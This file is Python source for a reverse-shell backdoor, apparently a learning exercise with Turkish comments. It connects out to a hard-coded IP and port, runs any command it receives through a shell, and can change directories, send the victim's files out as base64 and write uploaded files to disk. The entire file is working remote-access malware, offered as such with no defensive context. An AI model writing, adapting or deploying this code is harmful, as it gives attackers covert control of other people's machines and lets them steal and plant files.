import socket
import subprocess
import json
import os
import base64 #jpg türü dosyaları encode ve decod etmek için

class Backdoor:
	def __init__(self, ip, port):
		# AF_INET = IPv4 || SOCK_STREAM = TCP
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		if isinstance(data, bytes):
			data = data.decode("utf-8", errors="ignore")
		json_data = json.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))
		
	def json_receive(self):
		json_data = b""
		while True:
			try:
				received_data =  self.my_connection.recv(1024)
				json_data += received_data
				decode_data = json_data.decode("utf-8", errors="ignore")
				return json.loads(decode_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		# dosyayı binary olarak okuyucaz 
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def start_backdoor(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit": #çıkış işlemi
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1: #dizi değiştirme
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)
		self.my_connection.close()

my_socket_object = Backdoor("192.168.20.177",8080)
my_socket_object.start_backdoor()